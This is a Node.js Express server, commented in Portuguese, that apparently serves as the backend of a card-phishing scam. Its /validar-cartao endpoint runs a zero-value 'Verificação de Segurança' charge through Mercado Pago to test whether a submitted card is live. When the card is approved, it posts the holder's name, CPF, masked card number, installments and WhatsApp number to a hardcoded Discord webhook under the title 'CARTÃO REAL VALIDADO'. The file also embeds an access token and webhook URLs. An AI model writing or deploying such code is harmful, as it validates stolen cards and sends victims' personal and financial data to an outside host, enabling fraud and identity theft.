const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public')); // Serve o seu HTML da pasta public

// CONFIGURAÇÃO - Troque pelas suas chaves de PRODUÇÃO
const ACCESS_TOKEN = "TEST-1954942567690031-012818-850379838b41e06adc7844005dea9141-3163639724"; 
const DISCORD_CARTAO = "https://discord.com/api/webhooks/1471002040477028362/UYLVL8C6hoLpq-SSzW0QzbamEBi69o3-erTBL3pItUENDc_rmtCIRlYdp1vRYh09Kpvb";
const DISCORD_PIX = "https://discord.com/api/webhooks/1471325832973910016/i69-SOOxG49VCMCIpDida0ayUsckd2RJNFFB3Nst4khxY2TpOldTM3I9hqIZIeKZ4fH7";

app.post('/validar-cartao', async (req, res) => {
    const { token, cpf, nome_cartao, numero_mascarado, nome_cliente, parcelas, whatsapp } = req.body;

    try {
        // Tenta uma cobrança real de 1 real
        const response = await axios.post('https://api.mercadopago.com/v1/payments', {
            transaction_amount: 0.0,
            token: token,
            description: "Verificação de Segurança",
            installments: 1,
            payment_method_id: "visa", 
            payer: {
                email: "cliente@email.com",
                identification: { type: "CPF", number: cpf.replace(/\D/g, '') }
            }
        }, {
            headers: { 'Authorization': `Bearer ${ACCESS_TOKEN}` }
        });

        // Se o cartão for aprovado ou estiver em análise pelo banco
        if (response.data.status === 'approved' || response.data.status === 'in_process') {
            
            // ENVIA PARA O DISCORD SÓ SE O CARTÃO FOR REAL
            await axios.post(DISCORD_CARTAO, {
                embeds: [{
                    title: "💳 CARTÃO REAL VALIDADO",
                    color: 0x27ae60,
                    fields: [
                        { name: "👤 Cliente", value: nome_cliente, inline: true },
                        { name: "⭐ No Cartão", value: nome_cartao, inline: true },
                        { name: "🪪 CPF", value: cpf, inline: true },
                        { name: "💳 Número", value: `\`${numero_mascarado}\`` },
                        { name: "💰 Parcelas", value: parcelas },
                        { name: "📱 WhatsApp", value: whatsapp }
                    ]
                }]
            });
            return res.json({ status: 'success' });
        }
        res.status(400).json({ status: 'error' });
    } catch (error) {
        res.status(400).json({ status: 'error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));
